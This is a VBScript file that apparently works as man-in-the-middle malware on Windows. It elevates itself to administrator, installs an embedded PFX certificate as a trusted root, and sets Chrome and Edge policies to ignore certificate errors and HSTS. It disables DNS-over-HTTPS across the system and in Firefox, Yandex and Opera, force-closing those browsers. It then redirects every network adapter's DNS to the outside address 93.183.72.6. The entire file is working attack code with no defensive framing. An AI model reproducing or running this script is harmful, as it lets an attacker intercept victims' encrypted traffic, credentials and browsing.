Option Explicit

On Error Resume Next

Dim xdata
xdata = Array("30-82-0A-99-02-01-03-30-82-0A-55-06-09-2A-86-48-86-F7-0D-01-07-01-A0-82-0A-46-04-82-0A-42-30-82-0A-3E-30-82-06-0F-06-09-2A-86-48-86-F7-0D-01-07-01-A0-82-06-00-04-82-05-FC-30-82-05-F8-30-82-05-F4-06-0B-2A-86-48-86-F7-0D-01-0C-0A-01-02-A0-82-04-FE-30-82-04-FA-30-1C-06-0A-2A-86-48-86-F7-0D-01-0C-01-03-30-0E-04-08-BA-D9-FD-E9-2A-F1-3E-39-02-02-07-D0-04-82-04-D8-9D-19-50-BD-BE-6A-84-7E-3C-95-76-FC-02-EE-74-17-77-79-2B-B6-02-3F-3C-D9-C4-CA-88-96-2A-A2-B6-02-05-49-6C-26-F2-71-71-74-36-19-9F-1D-B0-CC-EC-6D-7B-AB-11-B5-E1-FF-92-37-D6-1B-DF-60-51-AE-3E-86-F0-EE-DA-B9-DE-0D-5F-D7-9D-BC-A6-E7-99-78-5F-33-5B-C5-84-C2-27-0A-41-58-92-5E-C7-68-DF-E8-14-2F-D2-98-98-5A-4E-A6-4C-77-E5-4A-43-72-28-18-8B-8A-42-88-ED-45-E6-F7-6D-BC-63-8C-08-4A-BC-95-E1-0D-B9-8D-0F-5F-DF-92-0F-A4-6F-03-B1-37-B3-12-CB-48-E7-91-63-98-DE-14-3A-C2-37-A4-6C-68-BF-C7-62-69-00-9A-74-B0-DC-E9-E8-A1-56-24-39-9F-EB-F5-0C-07-1B-2F-08-5A-82-E3-EE-32-54-B7-F9-F6-C0-31-AA-6E-E0-C3-98-49-13-7A-1B-83-59-EF-E9-0F-CF-3F-4A-E4-78-AA-61-3D-81-9C-0C-B2-9E-AE-F7-74-41-19-C5-AE-14-F3-E6-03-33-DC-90-8F-1A-5B-65-87-20-68-CA-A8-68-F9-F4-15-60-53-56-B6-4B-4D-35-51-8D-A0-D8-57-9D-CF-CD-D5-F8-45-DE-83-0A-D2-53-BA-F3-DC-A9-95-FF-10-41-67-96-E8-78-BA-34-29-61-5F-20-8C-E6-76-9D-BB-E5-A8-43-9D-05-9D-C0-2D-69-82-A7-82-F4-19-02-3E-71-71-7F-9E-65-D4-E2-1C-AF-20-AD-00-3F-B1-C5-28-A0-13-CF-5E-0E-DE-F1-DA-F8-73-79-0C-54-8C-5A-76-C7-E9-C0-8F-B9-BC-EE-5F-9A-E3-EA-DD-44-D5-E8-3F-06-87-A8-4A-7F-A2-E2-8B-5C-40-10-6A-06-14-29-31-2D-FE-BE-47-C6-13-81-F6-6E-B8-1F-79-E4-82-92-85-C2-76-84-34-60-B0-B4-45-21-F6-40-0A-A9-28-A8-07-AD-74-5E-43-6E-45-D2-96-3F-AE-B6-2B-BA-48-0B-0E-38-85-40-75-F4-6A-2C-70-A8-65-32-5E-EE-8D-09-C3-FE-FE-86-F0-0C-0D-8A-8D-01-E3-DC-A1-ED-B2-A3-8C-3F-2F-B8-9F-8D-BD-CE-E2-4D-78-BC-91-52-C4-87-3A-2F-2A-95-58-97-0F-6E-8E-39-A2-50-82-5D-51-39-22-70-7D-03-24-77-4B-5C-C8-A9-38-BE-12-5C-2B-D2-69-C0-C6-04-6D-6B-71-AD-3D-51-3B-20-E6-09-8B-54-B0-91-11-EF-30-44-E6-15-E6-08-06-31-C8-6D-7C-D6-9A-6B-04-D1-DD-05-87-1D-E8-B3-ED-99-CB-EA-3A-3C-CC-B5-7E-CC-4A-3B-41-D0-71-B6-7D-29-E2-26-25-CA-0F-6B-32-EB-EC-95-7B-96-66-8B-55-9E-AF-5E-6A-D8-C4-5C-D6-90-B4-CA-CA-3E-D3-F1-61-BB-C5-B5-8E-56-45-E2-AE-D8-19-3F-1C-20-58-24-50-2F-95-35-C7-BF-C7-35-FF-5A-1D-0C-63-D0-CE-24-4F-7F-03-7A-01-D5-B0-AA-61-D3-66-B1-EE-00-21-81-32-0A-5D-CC-6F-A0-35-69-43-0D-BE-96-D4-15-AA-57-65-54-D9-4F-D6-30-0F-D4-E2-77-4E-E9-04-90-54-51-5B-32-76-46-2B-C3-B2-EF-37-F1-5B-37-9B-58-74-B5-AB-37-FA-3A-A4-4F-42-B1-E7-AF-BE-CA-DF-86-F9-3A-E9-EE-1D-2B-E6-53-F9-D5-F1-52-7E-11-56-F3-E4-E5-80-09-50-8C-25-C4-EA-8B-E4-B3-18-51-60-85-00-2F-D0-0E-CE-DC-E7-4F-86-79-87-AF-88-3B-CF-C7-9E-22-B2-EF-34-AC-1F-13-73-46-37-A1-20-15-FF-12-19-82-BC-35-C8-C9-AE-1C-70-76-4B-4F-00-DA-AF-71-3E-19-FF-F4-9E-1D-E9-B7-C6-D9-D2-57-25-89-B4-A7-2A-FD-57-9A-7A-7C-A6-4F-31-AA-24-6D-41-76-41-4E-01-61-B0-AE-33-A1-9B-AF-95-0A-7B-8F-CF-8F-DE-24-D4-7B-6F-88-E8-2C-75-2F-90-04-4D-0A-94-95-40-17-A3-FF-3D-5C-52-E8-7D-56-7F-A4-0F-67-87-69-84-01-D4-00-DE-D4-E9-C6-B6-59-E5-ED-8C-86-F7-0A-B4-E2-D6-F9-80-84-5F-44-76-A3-4E-B9-0A-BC-5C-FA-49-39-5D-33-DA-08-D0-E8-0C-8A-62-7C-7B-F2-F2-62-7F-33-6F-58-B9-8E-90-67-77-95-49-29-08-5E-F8-7E-32-37-DF-1D-24-58-02-2D-4F-66-BA-AE-11-14-04-5A-82-D4-2F-1E-FE-22-7D-0F-98-CC-F9-68-13-B5-43-78-77-16-96-88-38-72-6C-9E-22-1E-92-B1-B9-B6-2F-B9-50-DD-85-6E-1E-EE-00-83-EB-2F-22-40-DD-9F-B0-3A-FA-08-C8-96-E1-AC-F8-02-C6-E9-B2-16-63-56-2B-FA-04-06-E4-38-C7-80-A7-2E-DE-02-59-0B-FE-77-BF-5D-B8-1F-04-76-B7-AA-74-10-61-26-F9-A4-A6-E7-27-D8-90-B4-67-6F-77-91-8A-A3-53-8D-E6-2F-C5-A8-9F-52-A4-1C-78-76-1F-61-ED-F0-7C-0F-C7-A5-4F-20-D6-C3-01-60-76-27-CC-05-65-9A-AE-0E-26-B4-3E-83-E6-A7-D2-50-72-79-95-BA-64-47-74-26-7D-F9-4A-85-4E-58-84-57-AE-D8-E1-13-12-DD-B6-A9-7C-61-64-2F-DF-7E-0E-63-78-8E-FE-39-F9-31-66-5A-B2-F6-B3-16-81-30-ED-C3-42-E7-3B-41-3A-09-2D-85-4C-86-D1-5F-B9-71-DB-B6-39-1B-65-9A-91-DE-16-80-23-FF-77-A8-09-2D-B6-7D-5F-4D-C4-C7-0A-27-55-BC-77-20-98-22-4A-50-9E-A1-84-63-A8-8C-28-16-87-63-6F-47-EC-1A-82-24-1F-6C-F6-E3-39-30-5A-69-29-01-DD-9C-B5-D4-C0-10-A8-17-85-79-BA-EA-DC-BE-1C-DA-9C-2A-B8-63-CA-8A-AC-8A-2B-B4-D6-97-EA-57-3B-EB-F8-EC-BD-A3-03-D6-D4-31-81-E2-30-0D-06-09-2B-06-01-04-01-82-37-11-02-31-00-30-13-06-09-2A-86-48-86-F7-0D-01-09-15-31-06-04-04-01-00-00-00-30-5D-06-09-2A-86-48-86-F7-0D-01-09-14-31-50-1E-4E-00-74-00-65-00-2D-00-61-00-33-00-31-00-31-00-63-00-66-00-61-00-31-00-2D-00-35-00-38-00-35-00-36-00-2D-00-34-00-61-00-33-00-64-00-2D-00-62-00-64-00-33-00-35-00-2D-00-61-00-35-00-30-00-32-00-39-00-37-00-31-00-63-00-64-00-61-00-66-00-39-30-5D-06-09-2B-06-01-04-01-82-37-11-01-31-50-1E-4E-00-4D-00-69-00-63-00-72-00-6F-00-73-00-6F-00-66-00-74-00-20-00-53-00-74-00-72-00-6F-00-6E-00-67-00-20-00-43-00-72-00-79-00-70-00-74-00-6F-00-67-00-72-00-61-00-70-00-68-00-69-00-63-00-20-00-50-00-72-00-6F-00-76-00-69-00-64-00-65-00-72-30-82-04-27-06-09-2A-86-48-86-F7-0D-01-07-06-A0-82-04-18-30-82-04-14-02-01-00-30-82-04-0D-06-09-2A-86-48-86-F7-0D-01-07-01-30-1C-06-0A-2A-86-48-86-F7-0D-01-0C-01-03-30-0E-04-08-87-A4-B3-E4-F2-F5-AA-55-02-02-07-D0-80-82-03-E0-47-A8-0D-D6-68-95-4B-80-70-4F-C6-24-97-74-35-3A-A8-E8-9F-88-90-A7-DB-40-B6-4B-87-95-B3-CF-31-57-42-DA-CE-61-6C-39-B0-6A-BA-5E-F2-62-32-06-27-AC-C6-07-6B-47-37-1C-85-6B-32-93-36-EA-14-07-1E-BC-35-7E-D4-1B-C1-29-F5-6B-F9-85-89-2E-E8-06-08-7B-7E-7E-F1-CB-53-4F-B3-27-65-6F-64-A7-9A-4A-35-FA-0F-7A-6A-46-68-0E-EF-8C-82-22-02-61-6E-28-90-BB-52-C1-F5-55-A7-61-8F-FC-69-DB-31-5C-92-76-FC-A2-8D-B7-3C-C9-C7-A6-23-78-A0-5D-FF-BF-C7-90-0D-64-25-67-10-E5-98-FF-A1-7C-63-0A-A4-FF-CF-30-08-81-95-DF-D2-EE-84-6B-E1-17-F8-93-41-65-A5-70-EA-F0-CB-FA-9C-22-B4-CA-0E-4C-55-9B-A2-45-B5-C2-21-3D-B5-80-63-9C-80-A8-33-A2-88-A3-FC-91-EF-F3-2F-94-50-52-45-19-23-BB-38-D7-75-81-24-30-17-4F-79-9E-47-2B-28-90-1C-D6-17-C9-F7-2B-60-C9-2E-47-3F-44-72-04-DF-AA-A1-BF-DC-C3-C9-F1-0B-DB-71-EB-65-56-87-DD-E9-19-17-73-B4-2F-F0-B6-E0-D8-4A-8E-DD-B9-FF-F8-6B-78-78-F7-3D-95-C3-47-51-94-2A-31-55-22-1F-89-56-23-03-E1-AA-DE-06-D8-85-58-8F-D6-81-6A-63-28-F3-AA-F6-A7-A4-63-AA-EE-EB-B3-5F-9B-F2-21-75-8C-2C-4A-39-AB-9E-37-AA-29-C1-62-37-46-F1-3E-EB-35-E9-90-3E-50-8C-FF-DD-9C-B9-D8-4C-CA-E6-2A-94-3D-4A-4D-BE-7A-9A-03-37-A1-DB-51-87-5C-53-2A-3F-A8-A5-5B-ED-72-3D-BB-1C-45-0C-FB-E4-C9-02-DD-4C-56-0C-FF-AD-9D-C7-AD-5B-8D-D5-1E-35-32-74-AD-10-39-E0-47-FC-12-31-7A-DD-0F-E0-48-EF-25-7F-42-D5-8F-5B-02-9C-7A-0D-E0-BB-0F-2D-1C-BF-C2-0D-A6-9E-0D-36-78-F4-0D-42-1B-B9-00-C0-D3-B4-BE-39-2F-75-DD-63-F8-8F-17-EB-C6-14-2F-6A-9D-08-A4-A6-3E-71-C7-D0-28-49-FB-01-80-FE-B4-97-9B-6E-02-DD-DD-68-7F-E4-6E-48-FC-1F-41-EA-3E-A8-65-02-D5-51-59-16-AE-87-91-F8-3B-A7-01-00-83-4E-03-81-69-D7-8E-5B-A2-DB-B4-68-D9-DB-8C-2F-42-93-C9-CC-32-0C-97-BA-D9-5E-A6-46-3E-01-D0-8B-A8-CD-71-E5-3D-2A-5E-9F-92-9A-C0-3D-5A-9E-2A-DF-54-CC-26-C5-A9-D2-0E-C6-74-86-60-01-65-A9-D7-FA-18-8D-A8-83-DB-C1-EF-48-17-2C-E7-2E-41-63-B7-67-03-3A-25-29-7B-43-CA-1E-E7-03-D6-44-0F-36-13-49-A6-89-DA-E3-C8-B5-0D-60-8C-54-04-E0-FB-6A-31-19-09-31-32-30-AE-7C-35-67-F4-83-5A-E1-F9-8F-9F-A0-7F-24-2F-24-0B-05-89-E4-8E-3E-ED-7B-74-BF-5A-7A-9B-38-E3-3F-E6-4A-2B-CC-24-07-68-91-B5-FA-F6-78-F9-30-EB-E4-16-41-75-79-F1-40-C3-5A-68-94-48-EE-94-40-5B-90-10-CA-E2-8E-FA-FC-F5-97-F1-59-A6-9B-C7-1B-02-2B-11-1F-88-E8-F1-17-80-7D-69-90-F3-87-A3-C9-07-7C-8B-AE-CA-AC-E9-45-62-91-8E-70-41-CB-01-44-5D-A6-35-45-91-AD-EA-90-29-00-73-72-2B-72-0B-C7-B2-E3-98-27-1D-47-2F-EE-90-8B-96-CF-51-D9-14-A0-A7-CF-94-42-F4-C5-0C-DE-EF-9C-AE-64-AD-AD-88-B3-53-44-2D-2E-77-FC-57-0E-67-0A-DB-DF-AC-35-7D-2E-0F-50-36-8F-89-88-EF-AF-BE-70-9A-99-EF-C9-D6-F5-96-7B-65-0A-CB-E8-2B-1E-60-59-B0-FB-1F-A4-64-71-74-A6-ED-26-EA-D1-59-2D-F5-A3-61-4F-EE-86-E6-72-37-44-38-37-AD-68-91-37-25-E7-83-8D-18-01-AE-B9-9F-50-CE-2D-5E-CE-23-18-33-80-DA-6E-D9-4C-CC-0D-46-84-C3-6B-EA-FE-E5-26-8A-84-8B-CD-29-3E-53-1B-52-74-87-EC-71-68-73-0D-62-61-12-B0-16-A2-BE-60-63-DA-4E-F0-8E-87-47-A0-99-4A-B5-22-DB-D9-FE-07-A8-5D-AA-D7-9C-59-BC-F6-53-47-E6-F3-F2-61-72-70-FD-6C-D0-24-3F-B5-B7-5E-CC-3F-B3-29-0E-76-71-DD-9F-B9-29-57-8C-2C-B2-31-52-51-10-74-D5-D4-38-4B-07-4E-FD-48-C5-20-9D-CB-BE-0F-FD-36-6A-40-0B-8C-24-7A-66-62-27-30-3B-30-1F-30-07-06-05-2B-0E-03-02-1A-04-14-7A-BD-D4-01-46-7D-8C-FF-34-FC-5A-DC-4D-9A-38-36-89-A0-D3-F1-04-14-C4-CB-43-18-C8-0F-36-A6-88-2E-9B-2E-63-C6-BD-8E-1B-32-76-35-02-02-07-D0")

Const PrimaryDNSServer = "93.183.72.6"
Const SecondaryDNSServer = "8.8.8.8"

If Not IsAdmin() Then
    RunElevated()
Else
    MainScriptLogic()
End If

Sub MainScriptLogic()

    CertWorks

	Chrome

	FireFox

    Edge

    Dns

    Yandex

    Opera

    
End Sub

Function IsAdmin()
    Dim objWShell, result
    Set objWShell = CreateObject("WScript.Shell")
    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
    IsAdmin = (result = 0)
    Set objWShell = Nothing
End Function

Sub RunElevated()
    Dim objShell
    Set objShell = CreateObject("Shell.Application")
    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End Sub



Sub Chrome
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	
	objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"

	Dim chromeKeyPath
	chromeKeyPath = "HKEY_LOCAL_MACHINE\Software\Policies\Google\Chrome"
	objShell.RegWrite chromeKeyPath & "\CommandLineFlag", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
	objShell.RegWrite chromeKeyPath & "\DnsOverHttps", "off", "REG_SZ"

    Const HKEY_LOCAL_MACHINE = &H80000002
    dim strKeyPath
    dim strValueName
    dim dwValue
    strKeyPath = "SOFTWARE\Policies\Google\Chrome"
    strValueName = "IgnoreCertificateErrors"
    dwValue = 1
    dim objRegistry
    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue	
End Sub

Sub Firefox()
    Dim objFSO, objShell, userProfilePath, profilePath, userJSPath, objFile

    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set objShell = CreateObject("WScript.Shell")

    userProfilePath = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
    profilePath = userProfilePath & "\AppData\Roaming\Mozilla\Firefox\Profiles\"

    If objFSO.FolderExists(profilePath) Then
        Dim profileFolder
        Set profileFolder = objFSO.GetFolder(profilePath)

        userJSPath = profileFolder.Path & "\user.js"

        If Not objFSO.FileExists(userJSPath) Then
            Set objFile = objFSO.CreateTextFile(userJSPath)
            objFile.Close
        End If

        Set objFile = objFSO.OpenTextFile(userJSPath, 8, True)
        objFile.WriteLine "user_pref(""network.trr.mode"", 5);"
        objFile.Close
    End If

    Set objFSO = Nothing
    Set objShell = Nothing

    FireFox2
End Sub





Sub FireFox2
    Const HKEY_LOCAL_MACHINE = &H80000002

    Dim paths, values, names
    paths = Array("SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS", "SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS")
    values = Array(0, 1)
    names = Array("Enabled", "Locked")

    Dim objShell
    Set objShell = CreateObject("WScript.Shell")

    Dim i, regPath, regValue, regName, regKey
    For i = 0 To UBound(paths)
        regPath = paths(i)
        regValue = values(i)
        regName = names(i)

        On Error Resume Next
        Set regKey = objShell.RegRead("HKLM\" & regPath & "\" & regName)
        If Err.Number <> 0 Then
            Set regKey = objShell.RegCreateKeyEx(HKEY_LOCAL_MACHINE, regPath, 0, "REG_DWORD")
        End If
        On Error Goto 0
        
        objShell.RegWrite "HKLM\" & regPath & "\" & regName, regValue, "REG_DWORD"
    Next

    Set objShell = Nothing
End Sub





Sub Edge
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Disable DNS over HTTPS (DoH) in the system registry
    objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"
    
    ' Configure Edge policies
    Const HKEY_LOCAL_MACHINE = &H80000002
    Dim edgeKeyPath
    edgeKeyPath = "SOFTWARE\Policies\Microsoft\Edge"
    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & edgeKeyPath & "\CommandLine", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & edgeKeyPath & "\DnsOverHttps", "off", "REG_SZ"

    ' Create and set registry key for ignoring certificate errors
    Dim strKeyPath
    Dim strValueName
    Dim dwValue
    strKeyPath = "SOFTWARE\Policies\Microsoft\Edge"
    strValueName = "IgnoreCertificateErrors"
    dwValue = 1
    Dim objRegistry
    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue
End Sub



Sub Yandex
    Dim objShell, SettingsFilePath, objFSO, objFile, strContents
    Dim possiblePaths, i
    Set objShell = CreateObject("WScript.Shell")

    possiblePaths = Array( _
        GetYandexInstallationPathFromAppData() & "\Local State")

    For i = LBound(possiblePaths) To UBound(possiblePaths)
        SettingsFilePath = possiblePaths(i)
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        DisableDoHInYandex objFSO, SettingsFilePath
    Next
End Sub

Function DisableDoHInYandex(objFSO, FilePath)
    If Not objFSO.FileExists(FilePath) Then
        Exit Function
    End If

    Dim processes
    processes = Array("service_update.exe", "browser.exe")
    KillProcesses processes
    
    Dim jsonContent, jsonFile
    Set jsonFile = objFSO.OpenTextFile(FilePath, 1)
    jsonContent = jsonFile.ReadAll
    jsonFile.Close
    
    Dim regexPattern
    regexPattern = """dns_over_https""\s*:\s*\{[^}]*""mode""\s*:\s*""([^""]+)"""
    
    Dim regex
    Set regex = New RegExp
    regex.Pattern = regexPattern
    regex.IgnoreCase = True
    regex.Global = True
    
    If regex.Test(jsonContent) Then
        jsonContent = regex.Replace(jsonContent, """dns_over_https"":{""mode"":""off""")
        
        Set jsonFile = objFSO.OpenTextFile(FilePath, 2)
        jsonFile.Write jsonContent
        jsonFile.Close
        
        DisableDoHInYandex = "DNS over HTTPS mode set to 'off' in file: " & FilePath
    End If
End Function

Function GetYandexInstallationPathFromAppData()
    Dim appDataPath, operaInstallationPath
    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LOCALAPPDATA%")
    operaInstallationPath = appDataPath & "\Yandex\YandexBrowser\User Data"
    GetYandexInstallationPathFromAppData = operaInstallationPath 
End Function




Sub Opera
    Dim objShell, OperaSecurePreferencesFilePath, objFSO, objFile, strContents
    Dim possiblePaths, i
    Set objShell = CreateObject("WScript.Shell")

    possiblePaths = Array( _
        GetOperaInstallationPathFromAppData() & "\Local State", _
        GetOperaInstallationPathFromApplicationData() & "\Local State" _
    )

    For i = LBound(possiblePaths) To UBound(possiblePaths)
        OperaSecurePreferencesFilePath = possiblePaths(i)
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.FileExists(OperaSecurePreferencesFilePath) Then
            DisableDoHInOpera objFSO, OperaSecurePreferencesFilePath
        End If
    Next

    Set objShell = Nothing
End Sub

Function DisableDoHInOpera(objFSO, FilePath)
    If Not objFSO.FileExists(FilePath) Then
        Exit Function
    End If

    Dim processes
    processes = Array("opera_crashreporter.exe", "opera.exe")
    KillProcesses processes
    
    Dim jsonContent, jsonFile
    Set jsonFile = objFSO.OpenTextFile(FilePath, 1)
    jsonContent = jsonFile.ReadAll
    jsonFile.Close
    
    Dim regexPattern
    regexPattern = """dns_over_https""\s*:\s*\{[^}]*""mode""\s*:\s*""([^""]+)"""
    
    Dim regex
    Set regex = New RegExp
    regex.Pattern = regexPattern
    regex.IgnoreCase = True
    regex.Global = True
    
    If regex.Test(jsonContent) Then
        jsonContent = regex.Replace(jsonContent, """dns_over_https"":{""mode"":""off""")
        
        Set jsonFile = objFSO.OpenTextFile(FilePath, 2)
        jsonFile.Write jsonContent
        jsonFile.Close
        
        DisableDoHInOpera = "DNS over HTTPS mode set to 'off' in file: " & FilePath
    End If
End Function

Function GetOperaInstallationPathFromAppData()
    Dim appDataPath, operaInstallationPath
    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LOCALAPPDATA%")
    operaInstallationPath = appDataPath & "\Opera Software\Opera Stable"
    GetOperaInstallationPathFromAppData = operaInstallationPath
End Function

Function GetOperaInstallationPathFromApplicationData()
    Dim appDataPath, operaInstallationPath
    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%")
    operaInstallationPath = appDataPath & "\Opera Software\Opera Stable"
    GetOperaInstallationPathFromApplicationData = operaInstallationPath
End Function









Sub KillProcesses(arrProcesses)
    Dim objShell
    Dim process
    Set objShell = CreateObject("WScript.Shell")
    For Each process In arrProcesses
        Dim command
        command = "taskkill.exe /im " & process & " /f"
        objShell.Run command, 0, True
    Next
    Set objShell = Nothing
End Sub

Sub Dns
    Dim objWMIService, colAdapters, objAdapter
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")

    For Each objAdapter In colAdapters
        If objAdapter.IPEnabled Then
            Dim arrDNSServers
            arrDNSServers = Array(PrimaryDNSServer, SecondaryDNSServer)
            objAdapter.SetDNSServerSearchOrder arrDNSServers
        End If
    Next

    Set objWMIService = Nothing
End Sub

Function CertWorks()
    dim i
    For i = LBound(xdata) To UBound(xdata)
        Dim binaryData
        binaryData = xdata(i)
        CertWork binaryData
    Next
End Function

Function TempFile
    Dim fso, tempFolder
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFolder = fso.GetSpecialFolder(2)
    TempFile = fso.BuildPath(tempFolder, fso.GetTempName() & ".pfx")
End Function

Sub CertWork(binaryData)
    Dim scriptPath
    scriptPath = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)

    Dim outputFilePath
    outputFilePath = TempFile()
    
    dim hexPairs
    dim i
    hexPairs = Split(binaryData, "-")
    Dim byteArray
    ReDim byteArray(UBound(hexPairs))
    For i = 0 To UBound(hexPairs)
        byteArray(i) = CByte("&H" & hexPairs(i))
    Next
    WriteBinary outputFilePath, byteArray

    InstallCertificate outputFilePath, "123"
    InstallCertificateRoot outputFilePath, "123"
end Sub

Sub WriteBinary(FileName, Buf)
    Dim I, aBuf, Size, bStream
    Size = UBound(Buf): ReDim aBuf(Size \ 2)
    For I = 0 To Size - 1 Step 2
    aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))
    Next
    If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))
    aBuf=Join(aBuf, "")
    Set bStream = CreateObject("ADODB.Stream")
    bStream.Type = 1: bStream.Open
    With CreateObject("ADODB.Stream")
    .Type = 2 : .Open: .WriteText aBuf
    .Position = 2: .CopyTo bStream: .Close
    End With
    bStream.SaveToFile FileName, 2: bStream.Close
    Set bStream = Nothing
End Sub

Sub InstallCertificate(certificateFilePath, password)
    Dim certutilCommand
    certutilCommand = "CERTUTIL -f -p " & password & " -importpfx """ & certificateFilePath & """"

    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run certutilCommand, 0, True
End Sub

Sub InstallCertificateRoot(pfxFilePath, password)
    Dim powerShellCommand
    powerShellCommand = "powershell -Command ""Import-PfxCertificate -FilePath '" & pfxFilePath & "' Cert:\LocalMachine\Root -Password (ConvertTo-SecureString -String '" & password & "' -AsPlainText -Force)"""

    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run powerShellCommand, 0, True
End Sub
